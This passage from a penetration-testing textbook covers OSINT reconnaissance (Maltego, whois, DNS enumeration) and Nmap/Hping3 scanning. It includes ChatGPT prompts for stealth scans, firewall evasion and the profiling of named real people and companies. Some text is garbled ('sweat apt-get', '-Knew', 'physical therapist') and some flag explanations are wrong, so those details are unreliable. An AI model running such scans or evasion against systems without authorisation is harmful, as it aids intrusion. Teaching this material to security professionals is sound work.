3. Select the “Whois” option under “Records” and click “Domain Folder” to access the

DNS Records Information Gathering Tool (Figure 3.37).

4. Input the desired domain name in the text field and click the “Search” button, as shown in Figure 3.38.

5. The console will display the search results, which may encompass information such as

WHOIS records and DNS data (Figure 3.39).

Figure 3.36 OSINT framework.





84 Traditional vs Generative AI Pentesting

Figure 3.37 Domain name lookup on OSINT.

Figure 3.38 DNS record lookup on domain folder.





GenAI-driven reconnaissance for effective penetration testing 85

Figure 3.39 Search result on domain dossier.

6. Additionally, you may utilize alternative tools inside the various OSINT categories

framework to get supplementary information (Hernández et al., 2018), and include techniques for obtaining information from social media to identify profiles linked to the

domain.

MALTEGO: A FRAMEWORK FOR COLLECTING INFORMATION

• Maltego is a highly potent data mining application that provides a limitless array of

tools and methodologies for information acquisition (Schwarz & Creutzburg, 2021).

Maltego queries several web data sources and use sophisticated “transformations” to

change one piece of information into another.

• For instance, if we conduct a campaign to gather user information, we may provide

an email address and, through many automated searches, “convert” it into a corre-

sponding phone number or postal address. In the organizational information collection

phase, we may provide a domain name and convert it into a web server, followed by

a compilation of email addresses, a catalog of related social media accounts, and a list

of possible passwords for that email account. The combinations are limitless, and the

acquired information is shown in a scalable graph that facilitates effortless zooming

and panning navigation.

• Maltego CE, the restricted “community version” of Maltego, is incorporated in Kali

and necessitates free registration for usage. Commercial variants are also accessible and

capable of managing bigger datasets.

• Initiate a new graph and position the “Domain” entity into the canvas via drag and

drop. Subsequently, input the domain name: tesla.com.

• Right- click and select the “All Transforms” option.

• Upon completion of the transformation procedure, the outcome will resemble the

image in Figure 3.40. The specifics of the particular domain, including email, individual, server information, etc., are visible.

• Initiate a new graph and position the “person” element onto the canvas with drag and

drop. Subsequently, input the individual’s name: Elon Musk, as shown in Figure 3.41.

• Right- click and select the “All Transforms” option.



86 Traditional vs Generativ

e AI P

entesting

Figure 3.40 Searching for a domain name on Maltego.





GenAI-driven reconnaissance for effective penetration testing 87

Figure 3.41 Searching for a person on Maltego.

OSINT WITH DNS QUERYING

DNS querying involves the collection of information on a target organization’s DNS servers

and their associated DNS records. A company may encompass several internal and external

DNS servers that furnish information such as domain names, contact data, domain owner-

ship information, usernames, computer identifiers, and IP addresses.

Perform Whois lookups

Penetration testers can access databases detailing registered users or beneficiaries of different internet resources, such as domain names, IP address blocks, and autonomous systems,

by employing the Whois query and answer protocol. This enables them to do Whois inqui-

ries. The whois databases, maintained by various internet registries, include information on domain name owners.

Whois tools may be utilized to acquire information on WHO database servers to retrieve

personal details such as the following:

• Domain Name Information

• Contact Information for Domain Owner





88 Traditional vs Generative AI Pentesting

• Domain Name System Servers

• Internet Protocol address and network range

• Records of Domain Creation and Expiration Dates

• Geographical Location

• Contact number and electronic mail address

• Technical and administrative representatives.

Upon acquiring the aforementioned information, the penetration tester can construct a net-

work diagram of the target business, manipulate the domain owners using social engineering, and then gain internal network information. The screenshot in Figure 3.42 illustrates the procedure for conducting a Whois lookup on a target.

APNIC Whois lookup (source: https://www.oonic.net )

The APNIC Whois Database is a publicly accessible searchable database that provides infor-

mation on address utilization in the Asia- Pacific region. The Whois database of APNIC

retains information as “objects.” As illustrated in Figure 3.43 Objects may encompass the

subsequent information:

• IP Address Ranges

• Routing protocols

• Reverse DNS Delegations

• Contact Information for the Network

Figure 3.42 Whois tool.





GenAI-driven reconnaissance for effective penetration testing 89

Figure 3.43 APNIC.

Figure 3.44 ARIN.

ARIN WhOIS.RIS (source: http://whois.arin.net)

The RESTful Web Service Whois ARIN (Whois- RWS) is an innovative directory service for

retrieving registration data from ARIN’s registration database. Whois- RWS may be inte-

grated into command- line routines akin to Whois or it can be accessed via a web browser, as

shown in Figure 3.44.

Dnsenum (https://github.com )

Dnsenum is a Perl script that enumerates DNS information for a domain to identify non-

contiguous IP blocks. This instrument performs the subsequent functions (Figure 3.45):

• Obtain the host’s address (A record).

• Acquire domain names (threaded).

• Obtain the MX (Mail Exchange) record.





90 Traditional vs Generative AI Pentesting

Figure 3.45 Dnsenum tool.

• Execute extensive searches on the name servers to retrieve the BIND VERSION

(multithreaded).

• Obtain extranouns and subdomains with Google scraping (Google query = "allinurl:-w

site:domain*").

• Enforce subdomains from a file by recursively querying a domain name that includes

NS records, utilizing a threaded approach.

• Determine the network ranges of Class C domains and execute threaded Whois searches

on these ranges.

• Execute reverse lookups on C network ranges (class and/or Whois network ranges)

using threading.

• Document IP blocks in domain_ips.txt.

Nslookup (source: https://docs.microsoft.com) Nslookup is an effective utility for diagnosing DNS problems, including domain name reso-lution. Upon initialization, Nslookup presents the hostname and IP address of the ONS

server specified for the local system, as shown in Figure 3.46.

What does a non- authoritative answer mean?

This indicates that the IP is not sourced from the authoritative server (Figure 3.47). What constitutes an authoritative server?

When you look for a website, it is initially queried in your local DNS server.

If the information is not located, the request is directed to the ROOT server, which pro-

vides the address of the Top- Level Domain server. Subsequently, this server will supply the address of the Authoritative server, which will respond to the query with the website’s IP

address and retain the most recent version of that website in your local DNS server.





GenAI-driven reconnaissance for effective penetration testing 91

Figure 3.46 Nslookup tool.

Figure 3.47 DNS hierarchy.





92 Traditional vs Generative AI Pentesting

Figure 3.48 Nslookup.io.

The web platform nslookup.io is also available for usage, as shown in Figure 3.48.

Lookup DNS records for the domain

Querying the DNS with the dig command, as shown in Figure 3.49.

You can get specific results for a recording, as illustrated in Figure 3.50.

Figure 3.49 Dig tool.





GenAI-driven reconnaissance for effective penetration testing 93

Figure 3.50 Searching for SOA record with dig.

Reverse domain name search

Find a website’s domain name from its IP address

We utilize technologies such as dnsrecon. On Linux: (https://github.com/darkoperator/

dnsrecon), dnsrecon is a Python software that aggregates DNS- related information. This script offers the following on a target:

• Verify all NS records for zone transfers.

• List the DNS entries for a specified domain (MX, SOA, NS, A, AAAA, SPF, and TXT).

• Conduct the enumeration of the existing VRS records.

• Top- level domain (TLD) extension.

• Verification of Wildcard Resolution.

• Extract A and AAAA records for subdomains and hosts from a domain and a word list.

• Investigating PTR records for a certain IP address range or CIDR.

• Examine a DNS server’s cached records for A, AAAA, and CNAME entries from a list

of host records included in a text file for verification.

Finding a company’s Top- Level Domains (TLDs) and subdomains

with AI

Using AI- powered tools such as ChatGPT and specialized utilities such as dig and Sublist3r, penetration testers can efficiently discover the top- level domains (TLDs) and subdomains

of a target organization. This process helps create a detailed map of the target’s network

infrastructure.

Example 1: Enumerate subdomains with Sublist3r

The Sublist3r tool automates subdomain discovery and stores the results in a text file for further analysis. Figure 3.51 illustrates the command to enumerate subdomains for “eccouncil.

org”: sublist3r -d certifiedhacker.com -o ertifiedhacker_subdomains.txt.

Use Sublist3r to gather a list of subdomains of target organization, as shown shown in

Figure 3.52.





94 Traditional vs Generative AI Pentesting

Figure 3.51 Enumerate subdomains with Sublist3r.

Figure 3.52 Enumerate subdomains with Sublist3r.

Explanation:

• sublist3r: Executes the Sublist3r tool.

• -d certifiedhacker.com: Specifies the target domain.

• -o certifiedhacker _subdomains.txt: Saves the results to a file named certifiedhacker

_subdomains.txt.

AI tools such as ChatGPT can be prompted to streamline these tasks. For instance

Prompt: “Use Sublist3r to gather a list of subdomains for the target organization

certifiedhacker.com .”

Figure 3.53 shows subdomains associated with the target





GenAI-driven reconnaissance for effective penetration testing 95

Figure 3.53 Subdomains results.

Result: The AI automates the process, generating a comprehensive list of subdomains.

Sublist3r checks various data sources, including search engines (e.g., Google, Bing),

DNSdumpster, and ThreatCrowd, to provide accurate and detailed results.

Reverse DNS Lookup

dnsrecon -r 162.241.216.0-162.241.216.255

One of these addresses belongs to certfiedhacker.com, we found it by searching for the domain name, as shown in Figure 3.54.

Performing DNS enumeration with DNSRecon

DNS lookups are a critical aspect of reconnaissance, providing valuable insights about the

target’s domain and its associated infrastructure. By leveraging AI- powered technologies,

penetration testers can automate DNS enumeration tasks, saving time and ensuring thor-

oughness. Tools enhanced by AI can efficiently perform reverse DNS lookups, retrieve DNS

records, and uncover domain relationships.

For instance, testers can use AI- based tools such as ChatGPT to execute DNS lookup com-

mands effectively. A practical example is instructing ChatGPT to install and use DNSRecon, a DNS enumeration tool, to gather information on a specific domain, as shown in Figure 3.55.

Prompt Example: “Install and use DNSRecon to perform DNS enumeration on the target

domain www.certifiedhacker.com. ”

DNSRecon is a versatile tool used for DNS enumeration, capable of retrieving critical

DNS records and uncovering valuable insights about a target domain. The following shell





96 Traditional vs Generative AI Pentesting

Figure 3.54 Dnsrecon tool.

Figure 3.55 Prompt for installing and performing DNSRecon with AI.

command shown in Figure 3.56 demonstrates how to use DNSRecon for DNS enumeration on the target domain http://www.certifiedhacker.com/:

sudo apt- get update && sudo apt- get install -y dnsrecon && dnsrecon -d certifiedhacker.

com -t std





GenAI-driven reconnaissance for effective penetration testing 97

Figure 3.56 DNSRecon on target certifiedhacker.com.

DNSdumpster

DNSdumpster (https://dnsdumpster.com/) is a domain research instrument that enables the discovery of diverse information on a domain. It is especially beneficial for network security researchers and penetration testers, as it offers a detailed representation of a domain’s DNS

information. The screenshot in Figure 3.57 illustrates the application of the DNSdumpster

command on a specified domain.

Figure 3.57 Dnsdumpter tool.





98 Traditional vs Generative AI Pentesting

Draw a network diagram using traceroute analysis

A penetration tester must ascertain the network architecture of the target firm. By delineating the network’s architecture, one can construct a diagram of the target network to acquire information regarding its topology, the routes to the target hosts, and the locations of firewalls, intrusion detection systems (IDS), trusted routers, and other access control mecha-

nisms within the network.

Traceroute

Traceroute is a Linux network diagnostic utility used to detect and measure the route fol-

lowed by an IP packet inside a dispersed network environment. The screenshot in Figure 3.58

illustrates the application of the traceroute command on a specified domain.

Example of AI- enhanced tracerouting

Using an AI tool such as ChatGPT, testers can be guided to execute commands efficiently, as

shown in Figure 3.59. For example:

Prompt: “Perform network tracerouting to discover the routers on the path to a target host

www.certifiedhacker.com .”

Figure 3.58 Traceroute tool.





GenAI-driven reconnaissance for effective penetration testing 99

Figure 3.59 Prompt and output of using Tracerout with AI.

AI- POWERED OSINT TOOLS

Artificial Intelligence (AI) has transformed Open- Source Intelligence (OSINT) by enhanc-

ing data collection, processing, and analysis capabilities. AI- powered OSINT tools enable

investigators to extract actionable intelligence efficiently while offering insights that were challenging to achieve with traditional methods.

Key use cases of AI in OSINT

• Web Scraping: Automates the collection of online data from social media, forums, and web pages, tracking trends and extracting specific information such as user behavior

and comments.

• Pattern Recognition: Uses Machine Learning (ML) to identify relationships between entities such as names, companies, and contact details in large datasets.

• Content Summarization: Natural Language Processing (NLP) summarizes extensive

data, such as extracting key details from large volumes of PDF files.

• Sentiment Analysis: Evaluates public sentiment by analyzing text for emotional tone, helping understand user opinions and predicting behavior.

• Image Recognition: Applies computer vision to analyze images and videos, supporting tasks such as face recognition, metadata extraction, and reverse image search.





100 Traditional vs Generative AI Pentesting

Benefits of AI in OSINT

1. Improved Efficiency: Automates repetitive tasks such as web scraping, accelerating investigations.

2. Expanded Scope: Analyzes data from the surface web, deep web, and dark web to

uncover hidden patterns and relationships.

3. Enhanced Visibility: Connects scattered data points into networks of information, aiding in recognizing trends and connections.

4. Investigator Safety: Anonymizes and automates OSINT processes, reducing exposure to risks during sensitive investigations.

Notable AI- powered OSINT tools

1. Taranis AI: Enhances OSINT by collecting and analyzing unstructured data such as

news articles. Key features include:



a. Multi- format outputs (PDF reports, structured data).



b. Seamless publishing of intelligence products.

2. OSS Insight: Focuses on analyzing GitHub activity with features like:



a. GPT- powered queries for repository data.



b. Developer and repository analytics to identify vulnerabilities, trends, and

productivity.

Footprinting using AI script

Figure 3.60 shows how to generate a prompt for Footprinting using AI script.

Automating domain footprinting with AI

Figure 3.61 illustrates an example of Footprinting using AI script.

Figure 3.60 Footprinting using AI script.





GenAI-driven reconnaissance for effective penetration testing 101

Figure 3.61 Automating footprinting using AI script.

DOCUMENTATION OF RESULT

Recording the outcomes is a crucial procedure for every physical therapist. During a penetration test, the tester must record any findings acquired from open- source intelligence. Upon completion of all processes, he must meticulously reassemble the results. Upon the completion of all phases of the TA, this document constitutes the foundation for the final report. It must have significant and comprehensive information regarding the discovered vulnerabilities, including the following:

• Domain and its subdomains

• Staff Contact Information: Telephone Number and Email Address

• Merchandise/Services

• Networking Equipment

• Catalog of Websites, Technology, and External Resources

• Public IP Address Range DNS Entries.

CONCLUSION

Reconnaissance and OSINT are essential elements of any effective penetration testing opera-

tion. By methodically collecting and examining publicly available data, penetration testers can create a comprehensive outline of the target’s digital footprint. This chapter has examined the methodologies, instruments, and sophisticated AI- driven techniques that enhance

the reconnaissance process.





102 Traditional vs Generative AI Pentesting

The objective remains unchanged: to identify vulnerabilities using Google hacking opera-

tors, social media insights, or advanced tools such as Maltego and SpiderFoot, while adher-

ing to ethical and legal constraints.

The integration of AI has revolutionized this domain, rendering data collection and analysis significantly swifter and more efficient. By integrating traditional techniques with AI- driven solutions, penetration testers can enhance their efficiency, precision, and breadth of assessment. Maintaining accurate documentation of findings guarantees transparency, accountabil-

ity, and actionable intelligence for stakeholders.

Chapter 4 will examine vulnerability assessment and the tools that enable penetration testers to identify and assess weaknesses within an organization’s infrastructure. This refines your offensive evaluations into highly effective and efficient security assessments.

REFERENCES

Augustyn, D., & Tick, A. (2020). Security Threats in Online Metasearch Booking Services. 2020 IEEE

20th International Symposium on Computational Intelligence and Informatics (CINTI), 17–22.

Calishain, T., & Dornfest, R. (2003). Google hacks. “O’Reilly Media, Inc.”

Dinis, B., & Serrão, C. (2014). Using PTES and open- source tools as a way to conduct external foot-

printing security assessments for intelligence gathering. Journal of Internet Technology and Secured

Transactions (JITST), 3/4, 271–279.

Hankin, C., & Malacaria, P. (2022). Attack dynamics: an automatic attack graph generation framework

based on system topology, CAPEC, CWE, and CVE databases. Computers & Security, 123, 102938.

Hernández, M., Hernández, C., Díaz- López, D., Garcia, J. C., & Pinto, R. A. (2018). Open source intel-

ligence (OSINT) as Support of Cybersecurity Operations: Use of OSINT in a Colombian Context

and Sentiment Analysis. Revista Vínculos Ciencia, Tecnología y Sociedad, 15(2).

Hwang, Y.-W., Lee, I.-Y., Kim, H., Lee, H., & Kim, D. (2022). Current status and security trend of osint.

Wireless Communications and Mobile Computing, 2022.

Maleh, Y. (2024). Web application PenTesting: A comprehensive Guide for professionals. CRC Press.

Matherly, J. (2015). Complete guide to shodan. Shodan, LLC (2016- 02- 25), 1.

Pastor- Galindo, J., Nespoli, P., Mármol, F. G., & Pérez, G. M. (2020). The not yet exploited goldmine of

OSINT: Opportunities, open challenges and future trends. IEEE Access, 8, 10282–10304.

Schwarz, K., & Creutzburg, R. (2021). Design of Professional Laboratory Exercises for Effective State-

of-the-Art OSINT Investigation Tools-Part 1: RiskIQ Passive-Total. Electronic Imaging, 33, 1–7.

Tabatabaei, F., & Wells, D. (2016). OSINT in the Context of Cyber- Security. Open Source Intelligence

Investigation: From Strategy to Implementation, 213–231.

Toffalini, F., Abbà, M., Carra, D., & Balzarotti, D. (2016). Google dorks: Analysis, creation, and new

defenses. Detection of Intrusions and Malware, and Vulnerability Assessment: 13th International

Conference, DIMVA 2016, San Sebastián, Spain, July 7- 8, 2016 , Proceedings 13, 255–275.

Troia, V. (2020). Document Metadata.

Zaoui, M., Yousra, B., Yassine, S., Yassine, M., & Karim, O. (2024). A comprehensive taxonomy of social engineering attacks and defense mechanisms: Towards effective mitigation strategies. IEEE

Access, 12, 72224–72241, doi: 10.1109/ACCESS.2024.3403197





Chapter 4

GenAI- enhanced scanning and sniffing

INTRODUCTION

In the evolving landscape of cybersecurity, information gathering is a critical phase in penetration testing and network defense. Whether performed passively or actively, reconnais-

sance enables security professionals to map the digital footprint of target systems, identify vulnerabilities, and assess potential attack vectors before exploitation occurs (Maleh, 2024).

This chapter explores the methodologies, tools, and strategies used to collect actionable intelligence on networks, with a focus on both foundational and advanced techniques (Glăvan

et al., 2020).

Passive reconnaissance involves discreetly collecting data without directly interacting with the target, leveraging open- source intelligence (OSINT) sources such as domain records,

social media, and leaked credential databases (Hwang et al., 2022; Tabatabaei & Wells,

2016). However, passive methods alone are insufficient for a comprehensive security assessment. Active reconnaissance takes information gathering a step further by engaging directly with the target system to probe for weaknesses. Techniques such as port scanning, network

enumeration, and protocol analysis allow penetration testers to detect open services, misconfigurations, and potential entry points (Gregorczyk et al., 2020).

When conducting penetration testing, reconnaissance serves as the foundation for a suc-

cessful security assessment. The more information gathered about a target network, the bet-

ter the chances of identifying vulnerabilities and potential attack vectors. Before attempting any form of exploitation, systematic information gathering is essential.

Consider a scenario where an organization provides a set of IP addresses for a security

audit. Before engaging in active testing, it is crucial to map the services running on the hosts.

Some systems may function as web servers, while others might operate as database servers,

file- sharing systems, or domain controllers. Identifying these roles helps in determining an effective testing strategy.

Every networked system relies on ports to handle multiple simultaneous connections. A

port is a logical construct that enables communication between applications, allowing dif-

ferent types of network traffic to be processed efficiently. For instance, a web browser uses separate ports to load multiple web pages at once, and a web server must allocate distinct

ports to differentiate services such as HTTP and HTTPS. Enterprise services, such as direc-

tory authentication and file sharing, also use specific ports, such as 389 for LDAP and 445

for SMB (Maleh, 2021; Sadqi & Maleh, 2022).

When a client initiates a network connection, it selects a temporary port to communi-

cate with a listening port on the target server. Accessing a secure website, for example, may involve the client using port 50234 to connect to the server’s port 443 for HTTPS. Since there are 65,535 possible ports, security assessments must determine which are actively listening.

While many ports follow standard assignments, attackers often scan for misconfigured or

DOI: 10.1201/9781003640318-4

103





104 Traditional vs Generative AI Pentesting

Table 4.1 Port classes

Category

Ports

Known Ports

0-1023

Registered Ports

1024- 49151

Private Ports

49152- 65535

The most known/used ports.

Table 4.2 Most used ports

Port Number

Service

20

FTP

22/23

SSH/TELNET

25

SMTP

53

DNS

80/443

HTTP/HTTPS

161

SNMP

88

KERBEROS

unauthorized services that could serve as entry points. The classes of ports are presented in

Table 4.1, and the most used ports are presented in Table 4.2.

This chapter introduces key tools for active reconnaissance, including Nmap for detailed

port and service discovery, Wireshark for deep packet inspection, and Hping3 for advanced

network probing. It also discusses automated vulnerability scanning solutions such as Nessus, which streamline the process of identifying security gaps. Additionally, the integration of AI-powered tools such as ChatGPT is explored, demonstrating how automation can enhance

reconnaissance efficiency by generating custom scanning scripts and optimizing vulnerability detection workflows.

By the end of this chapter, readers will have a strong understanding of the reconnaissance

process, equipping them with the necessary skills to analyze network topologies, uncover

security weaknesses, and prepare for subsequent penetration testing phases.

Nmap: NETWORK MAPPER

Nmap (short for “Network Mapper”) is a popular open- source tool for network exploration

and security auditing. It was created by Gordon Lyon (also known as “Fyodor”) in 1997

and has since become one of the most widely used network scanning tools (Lyon, 2011;

Velu, 2022).

Nmap uses various techniques to identify hosts and services on a network, including port

scanning, OS fingerprinting, and service version detection. It can be used to discover hosts and devices on a network, map out network topology, identify open ports and services, and

perform vulnerability assessments.

• NMAP is the scanner industry standard. It’s an extremely powerful tool, made even more powerful by its scripting engine that can be used to scan for vulnerabilities and,

in some cases, even run the exploit directly!





GenAI-enhanced scanning and sniffing 105

Figure 4.1 Three way- handshake.

• The three basic types of nmap scans include, as shown in Figure 4.1:

• TCP Connect Scans (-sT)

• SON “Half- open” Scans (-sS)

• UDP Scans (-sU)

• Other types of scans exist:

• TCP Null Scans (-sN)

• TCP FIN Scans (-sF)

• TCP Xmas Scans (-sX)

Installation of Nmap

Installing on Linux

Most Linux distributions include Nmap In their software repositories, you can install it using your favorite package manager. For example, to install Nmap on a Debian or Ubuntu- based

distribution, you can use the following command:

sweat apt-

get update sudo apt-

get install nmap

Installation on Windows

To install Nmap on Windows, you can download the installer from the official website of

Nmap ( https:// nmap. org/ download. html) and follow the installation instructions.

Install on macOS

Nmap can be installed on macOS using Homebrew, a popular package manager for macOS.

To install Homebrew, you can follow the instructions on their official website ( https:// brew.

sh/). Once you have installed Homebrew, you can use the following command to install Nmap: brew install nmap





106 Traditional vs Generative AI Pentesting

Using Nmap

Basic syntax

The basic syntax of Nmap is as follows:

nmap [options] target

“target” can be a domain name, an IP address, or a CIDR network. Here are some options

commonly used with Nmap:

• -p: Specifies the ports to scan. You can specify a comma- separated list of ports or dash-separated port ranges. Like what -p 80,443 or -p 1- 1000.

• -sS: Specifies a SYN analysis (half- open), which allows you to scan ports without establishing a full connection to the host.

• -O: Enables operating system detection, which helps identify the operating system used by the host.

• -A: Enables service version detection, which helps identify service versions that are running on open ports.

Here’s an example of an Nmap command that scans open ports on the IP address 192.168.1.1:

nmap -sS -O 192.168.1.1

Examples of use

Here are some common examples of how Nmap can be used:

To scan All ports open on a host:

nmap -p-

target

To scan The most commonly used ports:

nmap -F target

To scan An entire network:

nmap -sS 192.168.1.0/24

Scan options

• -sS: SYN scan (half- open), which is the most common and fastest port scan. It does not establish a full connection with the target host, which can avoid triggering security

alerts.

• -St: TCP scan connect, which is similar to a SYN scan, but establishes a full connection with the host. It can be slower and may be detected by security systems.

• -Knew: UDP scan, which attempts to detect open UDP ports. UDP scans can be slower than TCP scans because Nmap Sends multiple requests for each port.

• -Sx: Xmas scan, which sends TCP packets with the FIN, PSH, and URG flags activated.

This type of scan can be used to bypass certain firewalls and trigger security alerts.





GenAI-enhanced scanning and sniffing 107

Output options

• -oN: Saves the scan results to a file in normal format.

• -oX: Saves the scan results to an XML file.

• -oG: Saves the scan results in a file in greppable format.

Identification options

• -O: Enables operating system detection, which helps identify the operating system used by the host.

• -sV: Enables service version detection, which helps identify service versions that are running on open ports.

Port options

• -p: Specifies the ports to scan. You can specify a comma- separated list of ports or dash-separated port ranges. For example, -p 80.443 or -p 1- 1000.

• -Pn: Ignores host discovery and assumes that the host is online.

Attack options

• -f— Fragments packets to bypass packet filters.

• --script: runs Nmap scripts to detect vulnerabilities or additional information about hosts.

Examples of advanced use

• To scan an entire network using a port list file:

nmap -p $(cat ports.txt | tr '\n' ',') 192.168.1.0/24

• To scan network using Nmap scripts:

nmap --script vuln 192.168.1.0/24

• To scan a network and save the results in an XML file:

nmap -sS -sV -oX scan_results.xml 192.168.1.0/24

• To scan a host using a proxy SOCKS5:

nmap --proxy socks5://127.0.0.1:1080 target

Nmap: TCP Connect Scan -sT

• Le scan TCP Connect works by performing the three- way handshake with each target

port in turn. In other words, Nmap tries to connect to each specified TCP port and

determines whether the service is opened by the response it receives.

• If nmap sends a TCP request SYN on a closed port, the target server will respond with

a TCP RST (Reset) packet. By this response, nmap can establish that the port is closed.

• If the request is sent to an open port, the target will respond with a TCP packet SYN/

ACK. nmap marks this port as open (and completes the three- way handshake by return-

ing a TCP packet with ACK enabled).





108 Traditional vs Generative AI Pentesting

Figure 4.2 TCP SYN scan.

• Many firewalls are configured to simply drop incoming packets. Nmap sends a TCP

request SYN and receives nothing in return as shown in Figure 4.2. This indicates that the port is protected by a firewall and therefore the port is considered filtered.

Nmap: TCP SYN Scan -sS (Stealth)

• The SYN scan sends a TCP packet RST after receiving a SYN/ACK server, as shown in

Figure 4.3. Used to bypass older IDSs or apps that log in once it’s been fully established.

• Les scans SYN are significantly faster than a TCP scan Connect standard. You have to

have sudo rights for SYN Scan (the default scan type for sudo).

• Can bring down an unstable system.

• Same rules for closed or filtered ports.

Figure 4.3 TCP SYN scan -sS (stealth).





GenAI-enhanced scanning and sniffing 109

Nmap: UDP Scan -sU

• Unlike TCP, UDP connections are stateless. UDP connections rely on sending packets to

a target port and hoping that they will arrive.

• UDP is suitable for connections that rely on speed rather than quality (e.g., video sharing), but the lack of acknowledgment makes UDP much more difficult (and much

slower) to parse.

• When a packet is sent to a UDP port open, there should be no answer. When this

happens, Nmap refers to the port as open|filtered. If it receives a response, the port is

marked as open. Most often, there is no response, in which case the request is sent a sec-

ond time as a cross- check. If there is still no response, the port is marked open|filtered.

• When a packet is sent to a UDP port closed, the target must respond with an ICMP

(ping) packet containing a message indicating that the port is unreachable. This clearly

identifies closed ports.

• The UDP Scan can be very slow if it is launched on all ports. It is recommended to use

it for the 20 most used ports:

nmap –sU –top-

ports 20 <target>

Nmap: The scripts

• The Nmap scripting engine (NSE) is an incredibly powerful addition to Nmap, greatly

expanding its functionality. NSE scripts are written in the Lua programming language

and can be used to do a variety of things: from finding vulnerabilities to automating

exploits for them. The NSE is particularly useful for recognition. However, it is worth

keeping in mind the breadth of the script library.

• There are many categories available. Some useful categories include:

• Safe: will not affect the target.

• Intrusive: Not safe: likely to affect the target.

• vuln: Vulnerability scanning.

• exploit: Attempting to exploit a vulnerability.

• auth: Attempting to bypass authentication for running services (example, connect-

ing to an FTP server anonymously).

• brute: Brute force attempt for running services.

• discovery: Attempting to query running services for more information about the

network (e.g., querying an SNMP server).

• For a complete list of nmap scripts check the following website: https:// nmap. org/ book/

nse- usage. html.

NMAP: Examples

• nmap -sV -p 1- 65535 192.168.1.1/24: This is a simple command to scan your local network. This command will scan your entire range of local IP addresses (assuming you’re

in the range 192.168.1.0-254), perform the -sV service identification, and scan all ports

-p 1 -65535. By running it as a normal user and not root, it will be a TCP- based scan

Connect. If the command is executed with sudoat first, it will run as a TCP SYN scan.

• You can scan multiple hosts by simply launching their IP addresses or hostnames with

Nmap: nmap 192.168.0.101 192.168.0.102 192.168.0.103.

• To save time and network resources, we can also analyze multiple IP addresses, looking

for a short list of common ports. For example, let’s perform a TCP connection analysis





110 Traditional vs Generative AI Pentesting

for the first 20 TCP ports with the --top- ports option and enable OS version detection,

script parsing, and traceroute with -A: nmap -sT -A --top- ports=20 10.11.1.1- 254 -oG

resultats.txt.

• We can also identify services running on specific ports by inspecting service banners

(-sVs) and running various enumeration scripts operating system and service (–A) on

the target: nmap -sV -sT -A 10.11.1.220.

NMAP Scanning with AI

AI tools, such as ChatGPT, can be used to generate optimized commands or scripts for these

tasks, making it easier for professionals to tailor scans based on specific objectives (Zaydi &

Maleh, 2024). This simplifies the scanning process by reducing manual input and focusing on actionable results.

Example #1

As shown in Figure 4.4, an attacker can use ChatGPT to perform this task by using an appropriate prompt such as: “Use Nmap to find open ports 1- 100 on target IP 192.168.64.2”.

Example #2

As shown in Figure 4.5, an attacker can use ChatGPT to perform this task by using an appropriate prompt such as: “Perform stealth scan on target IP 192.168.64.2 and display the results”.

Example #3

As shown in Figure 4.6, attackers can use ChatGPT to guide the use of Metasploit by using an appropriate prompt such as: “Use Metasploit to discover open ports on the IP address 192.168.64.2”.

Figure 4.4 Nmap to find open ports on target IP.





GenAI-enhanced scanning and sniffing 111

Figure 4.5 Perform stealth scan on the target IP.

Figure 4.6 Scan using Metasploit.





112 Traditional vs Generative AI Pentesting

Example #4

As shown in Figure 4.7, attackers can use ChatGPT to guide the use of Nmap by using an appropriate prompt such as: “Use Nmap to scan open ports through port 80 manipulation

target 192.168.64.2”.

Firewall Evasion

Example

As shown in Figure 4.8, attackers can use ChatGPT to guide the use of Nmap by using an appropriate prompt such as: “Use Nmap to fast scan to bypass firewall with packet fragmentation 8 bits on 192.168.64.2” .

Figure 4.7 Open port through port manipulation.

Figure 4.8 Nmap scan to bypass firewall.





GenAI-enhanced scanning and sniffing 113

Nmap to fragment

Figure 4.9 displays the use of Nmap, a powerful network scanning tool, to perform an advanced scan of a target host (here, 192.168.1.1) while attempting to evade firewalls and

detection systems.

Example

Figure 4.10 shows a scan for Malware- Exposed Ports:

Prompt: sgpt --chat scan --shell “Use Nmap to scan for malware- exposed ports such as

445 and 3389 on 192.168.0.0/24 and identify potential threats.”

Figure 4.9 NMAP to fragment.

Figure 4.10 Scan for malware- exposed ports.





114 Traditional vs Generative AI Pentesting

Figure 4.11 Prompt for NMAP scanning for host discover with AI.

Script to automate network scanning tasks with AI

Attackers can leverage AI- powered technologies to enhance and automate their network

scanning tasks. With the aid of AI, attackers can effortlessly create and run custom network scanning scripts and acquire valuable insights about their targets. By developing such custom scripts, attackers can efficiently execute a series of network scanning commands to gather

information about a target domain.

With this script, attackers can discover live systems, open ports, running services, service versions, and more on the target IP ranges.

As shown in Figure 4.11, attackers can use ChatGPT to guide the development of a script by using an appropriate prompt such as: “Develop a script that will automate network scanning efforts and find out live systems, open ports, running services, service versions, etc. on target IP range 192.168.1.0/24” .

The following bash script is designed to automate network scanning efforts on the target IP

range 192.168.1.0/24:

#!/bin/bash

nmap -sP 192.168.64.0/24 -oG - | awk '/Up$/{print $2}' > live_hosts.txt

&& nmap -iL live_hosts.txt -sV -oA scan_results && cat scan_results.nmap

Figure 4.12 shows the report of NMAP scan.

Hping3

Hping3 is a versatile command- line tool designed for network scanning and packet crafting, supporting TCP, UDP, ICMP, and raw- IP protocols. It is widely used for tasks such as:

• Network Security Auditing: Identifying and assessing security vulnerabilities.

• Firewall Testing: Verifying firewall rules and detecting open ports behind firewalls.

• Manual Path MTU Discovery: Calculating the maximum transmission unit for com-

munication paths.

• Remote OS Fingerprinting: Gaining insights into the target operating system and stack characteristics.

• Traceroute and Host Scanning: Advanced tracing and scanning, including anonymous

probing and idle scanning.





GenAI-enhanced scanning and sniffing 115

Figure 4.12 NMAP scan report.

Key features

• Sends customizable TCP/IP packets, mimicking common protocols to study target

behavior.

• Allows encapsulated file transfers and packet fragmentation.

• Identifies services and open ports by emulating legitimate traffic patterns.

• Detects whether a host is online even if ICMP requests are blocked.

• Supports IP spoofing for anonymized reconnaissance activities.

Advanced applications

Hping3 facilitates covert data transmission via its traceroute mode and can simulate behav-

iors akin to a firewall bypass. Its idle scanning capabilities enable attackers to map the target’s services and vulnerabilities stealthily.

Syntax

hping3 <options> <Target IP address>

By leveraging its features, Hping3 is not only a tool for ethical hackers and penetration

testers but also a critical asset for understanding and mitigating potential network vulnerabilities. Figure 4.13 shows an ICMP scanning.

Figure 4.14 shows an ACK scanning on port 80.





116 Traditional vs Generative AI Pentesting

Figure 4.13 ICMP scanning.

Figure 4.14 ACK scanning on port 80.





GenAI-enhanced scanning and sniffing 117

Hping commands

1. ICMP Ping

• Command: hping3 -1 10.0.0.25

